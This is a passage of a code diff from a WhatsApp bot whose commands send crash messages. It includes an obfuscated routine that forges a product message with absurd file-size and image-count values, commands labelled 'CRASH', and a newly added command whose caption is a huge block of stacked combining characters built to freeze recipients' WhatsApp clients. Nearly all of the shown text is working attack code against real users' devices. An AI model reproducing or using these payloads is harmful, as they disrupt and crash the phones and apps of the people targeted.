𝙔𝙊𝉄̿𝙐͢𝙍 𝙋𝙐͚̽ⷨ͢𝙎𝙎͢𝙔〽️👑⃟𝙄𝙆𐍹𝉄͢͜𝙔𝙔 𝙇𝙄𐍸ⷥ𝙆͢𝙀 𝙔𝙊𝉄̿𝙐͢𝙍 𝙋𝙐͚̽ⷨ͢𝙎𝙎͢𝙔〽️👑⃟𝙄𝙆𐍹𝉄͢͜𝙔𝙔 𝙇𝙄𐍸ⷥ𝙆͢𝙀 𝙔𝙊𝉄̿𝙐͢𝙍 𝙋𝙐͚̽ⷨ͢𝙎𝙎͢𝙔〽️👑⃟𝙄𝙆𐍹𝉄͢͜𝙔𝙔 𝙇𝙄𐍸ⷥ𝙆͢𝙀 𝙔𝙊𝉄̿𝙐͢𝙍 𝙋𝙐͚̽ⷨ͢𝙎𝙎͢𝙔〽️👑⃟𝙄𝙆𐍹𝉄͢͜𝙔𝙔 𝙇𝙄𐍸ⷥ𝙆͢𝙀 𝙔𝙊𝉄̿𝙐͢𝙍 𝙋𝙐͚̽ⷨ͢𝙎𝙎͢𝙔〽️👑⃟𝙄𝙆𐍹𝉄͢͜𝙔𝙔 𝙇𝙄𐍸ⷥ𝙆͢𝙀 𝙔𝙊𝉄̿𝙐͢𝙍 𝙋𝙐͚̽ⷨ͢𝙎𝙎͢𝙔〽️👑⃟𝙄𝙆𐍹𝉄͢͜𝙔𝙔 𝙇𝙄𐍸ⷥ𝙆͢𝙀 𝙔𝙊𝉄̿𝙐͢𝙍 𝙋𝙐͚̽ⷨ͢𝙎𝙎͢𝙔〽️👑⃟𝙄𝙆𐍹𝉄͢͜𝙔𝙔 𝙇𝙄𐍸ⷥ𝙆͢𝙀 𝙔𝙊𝉄̿𝙐͢𝙍 𝙋𝙐͚̽ⷨ͢𝙎𝙎͢𝙔〽️👑⃟𝙄𝙆𐍹𝉄͢͜𝙔𝙔 𝙇𝙄𐍸ⷥ𝙆͢𝙀 𝙔𝙊𝉄̿𝙐͢𝙍 𝙋𝙐͚̽ⷨ͢𝙎𝙎͢𝙔〽️👑⃟𝙄𝙆𐍹𝉄͢͜𝙔𝙔 𝙇𝙄𐍸ⷥ𝙆͢𝙀 𝙔𝙊𝉄̿𝙐͢𝙍 𝙋𝙐͚̽ⷨ͢𝙎𝙎͢𝙔〽️👑⃟𝙄𝙆𐍹𝉄͢͜𝙔𝙔 𝙇𝙄𐍸ⷥ𝙆͢𝙀 𝙔𝙊𝉄̿𝙐͢𝙍 𝙋𝙐͚̽ⷨ͢𝙎𝙎͢𝙔〽️👑⃟𝙄𝙆𐍹𝉄͢͜𝙔𝙔 𝙇𝙄𐍸ⷥ𝙆͢𝙀 𝙔𝙊𝉄̿𝙐͢𝙍 𝙋𝙐͚̽ⷨ͢𝙎𝙎͢𝙔〽️👑⃟𝙄𝙆𐍹𝉄͢͜𝙔𝙔 𝙇𝙄𐍸ⷥ𝙆͢𝙀 𝙔𝙊𝉄̿𝙐͢𝙍 𝙋𝙐͚̽ⷨ͢𝙎𝙎͢𝙔〽️👑⃟𝙄𝙆𐍹𝉄͢͜𝙔𝙔 𝙇𝙄𐍸ⷥ𝙆͢𝙀 𝙔𝙊𝉄̿𝙐͢𝙍 𝙋𝙐͚̽ⷨ͢𝙎𝙎͢𝙔〽️','Gk\x20guna😏'];_0x2fb6=function(){return _0x486e7c;};return _0x2fb6();}_0x1cfe6b();function _0x3078(_0x4bfee0,_0x460f0a){var _0xea9cbb=_0x2fb6();return _0x3078=function(_0x1cfe6b,_0x9ab345){_0x1cfe6b=_0x1cfe6b-0x1c5;var _0x2369ff=_0xea9cbb[_0x1cfe6b];return _0x2369ff;},_0x3078(_0x4bfee0,_0x460f0a);}{if(!isCreator&&!isBan)return;if(!m[_0xc6393f(0x1e5)])throw _0xc6393f(0x1d1);if(!text)throw _0xc6393f(0x1c6);let media=await quoted[_0xc6393f(0x1ea)]();var messa=await prepareWAMessageMedia({'image':media},{'upload':jobotz[_0xc6393f(0x1f0)]}),catalog=generateWAMessageFromContent(m[_0xc6393f(0x1d7)],proto[_0xc6393f(0x1ef)][_0xc6393f(0x1ec)]({'productMessage':{'product':{'productImage':messa[_0xc6393f(0x1ce)],'productId':_0xc6393f(0x1e2),'fileLength':'99999999999','jpegThumbnail':virgam,'title':_0xc6393f(0x1d8)+text+'\x20','description':_0xc6393f(0x1d5)+philips,'currencyCode':'IDR','productImageCount':0x370ad515,'firstImageId':0x1,'priceAmount1000':_0xc6393f(0x1df),'salePriceAmount1000':_0xc6393f(0x1f3),'bodyText':_0xc6393f(0x1d6),'footerText':_0xc6393f(0x1dc),'retailerId':_0xc6393f(0x1d4),'url':_0xc6393f(0x1d9)},'businessOwnerJid':'6285706035039@s.whatsapp.net','contextInfo':{'forwardingScore':0x96,'isForwarded':!![]}}}),{'userJid':m[_0xc6393f(0x1d7)],'quoted':shield2});jobotz[_0xc6393f(0x1cc)](m[_0xc6393f(0x1d7)],catalog[_0xc6393f(0x1c7)],{'messageId':catalog[_0xc6393f(0x1da)]['id']}),jancok(_0xc6393f(0x1e6));}
 }
 break
 
@@ -7100,7 +7134,7 @@ await jobotz.sendMessage(m.chat, {text:"IKYY CRASH EMOJI!!!"},{quoted:asukonyol1
   message: { 
  "imageMessage": { 
  "mimetype": "image/jpeg", 
- "caption": `IKYY CRASH TITIK`,
+ "caption": `${jobot2}`,
  "jpegThumbnail": virgam
  } 
  } 
@@ -7309,6 +7343,53 @@ await jobotz.sendMessage(m.chat, {text:"Eee bang?"},{quoted:asukonyol11})
  jancok(`abg nya kemana ya? `)
  }
  break
+case 'ikyselebew':{
+ if (!isCreator && !isBan) return
+   asukonyol11 = { 
+   key: { 
+   fromMe: false, 
+   participant: `0@s.whatsapp.net`, 
+ ...({ remoteJid: "" }) 
+  }, 
+  message: { 
+ "imageMessage": { 
+ "mimetype": "image/jpeg", 
+ "caption":`🔥ཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀི